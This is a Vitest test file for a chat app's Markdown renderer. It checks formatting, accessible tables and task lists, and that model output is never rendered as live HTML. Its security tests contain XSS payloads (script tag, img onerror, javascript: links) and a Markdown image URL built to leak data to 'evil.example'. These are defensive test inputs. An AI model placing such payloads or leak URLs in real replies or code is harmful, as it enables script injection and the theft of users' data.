import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown, safeUrl } from '../src/components/chat/markdown.tsx';

/* A reply's Markdown (CH-1, ADR 0105): what it draws, and what it never does with model output. */

const html = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe('replies as Markdown (CH-1)', () => {
  it('CH-1: draws emphasis, inline code, lists, quotes and code blocks', () => {
    const out = html(
      [
        '**Bold** and *italic* with `code`.',
        '',
        '- one',
        '- two',
        '',
        '1. first',
        '',
        '> quoted',
        '',
        '```python',
        'x = 1',
        '```',
      ].join('\n'),
    );
    expect(out).toContain('<strong>Bold</strong>');
    expect(out).toContain('<em>italic</em>');
    expect(out).toMatch(/<code[^>]*>code<\/code>/);
    expect(out).toMatch(/<ul[^>]*>\s*<li[^>]*>one<\/li>/);
    expect(out).toMatch(/<ol[^>]*>\s*<li[^>]*>first<\/li>/);
    expect(out).toMatch(/<blockquote[^>]*>/);
    expect(out).toMatch(/<pre[^>]*><code[^>]*>x = 1\n?<\/code><\/pre>/);
  });

  it('CH-1: a single newline is a line break, as replies were shown before', () => {
    expect(html('first line\nsecond line')).toMatch(/first line<br\/>\s*second line/);
    // Not inside code.
    expect(html('```\na\nb\n```')).not.toContain('<br/>');
  });

  it('CH-1: headings start at level 2, under the conversation title', () => {
    const out = html('# Title\n\n## Part');
    expect(out).toMatch(/<h2[^>]*>Title<\/h2>/);
    expect(out).toMatch(/<h3[^>]*>Part<\/h3>/);
    expect(out).not.toMatch(/<h1/);
  });

  it('CH-1: a table scrolls in a named, focusable region of its own', () => {
    const out = html('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(out).toMatch(/<div role="region" aria-label="Table 1, scrolls sideways" tabindex="0"/);
    expect(out).toMatch(/<th[^>]*>a<\/th>/);
    expect(out).toMatch(/<td[^>]*>2<\/td>/);
  });

  it('CH-1: two tables in a reply have regions of different names', () => {
    const table = '| a | b |\n| - | - |\n| 1 | 2 |';
    const out = html(`${table}\n\ntext\n\n${table}`);
    expect(out).toContain('aria-label="Table 1, scrolls sideways"');
    expect(out).toContain('aria-label="Table 2, scrolls sideways"');
  });
});

describe('task lists (CH-1)', () => {
  it('CH-1: a task is a drawn box that says Done or Not done, never a form control', () => {
    const out = html('- [x] shipped\n- [ ] next');
    expect(out).not.toContain('<input');
    expect(out).toContain('Done:</span>');
    expect(out).toContain('Not done:</span>');
  });
});

describe('model output stays data (CH-1, ADR 0105)', () => {
  it('raw HTML in a reply is dropped, never drawn', () => {
    const out = html('Hello <script>alert(1)</script><img src=x onerror=alert(1)> <b>bold</b>');
    expect(out).not.toMatch(/<script|<img|onerror|<b>/);
    expect(out).toContain('Hello');
  });

  it('links open apart from the app, and only for http, https and mailto', () => {
    const out = html('[docs](https://example.com/a) and [mail](mailto:a@example.com)');
    expect(out).toContain(
      '<a href="https://example.com/a" target="_blank" rel="noopener noreferrer nofollow"',
    );
    expect(out).toContain('href="mailto:a@example.com"');
    for (const bad of [
      '[x](javascript:alert(1))',
      '[x](data:text/html,hi)',
      '[x](/api/me)',
      '[x](//evil.example)',
    ]) {
      expect(html(bad)).not.toContain('href=');
    }
  });

  it('an image is never loaded: it is a link named by its alt text', () => {
    const out = html('![chart](https://evil.example/leak?q=secret)');
    expect(out).not.toContain('<img');
    expect(out).toMatch(/<a href="https:\/\/evil.example\/leak\?q=secret"[^>]*>chart<\/a>/);
    expect(html('![](https://example.com/x.png)')).toMatch(/>Image<\/a>/);
    expect(html('![x](javascript:alert(1))')).not.toContain('href=');
  });

  it('only absolute http, https and mailto addresses are safe', () => {
    expect(safeUrl('https://example.com')).toBe('https://example.com');
    expect(safeUrl(' HTTP://example.com ')).toBe('HTTP://example.com');
    expect(safeUrl('mailto:a@example.com')).toBe('mailto:a@example.com');
    expect(safeUrl('javascript:alert(1)')).toBeUndefined();
    expect(safeUrl('/relative')).toBeUndefined();
    expect(safeUrl(undefined)).toBeUndefined();
  });
});
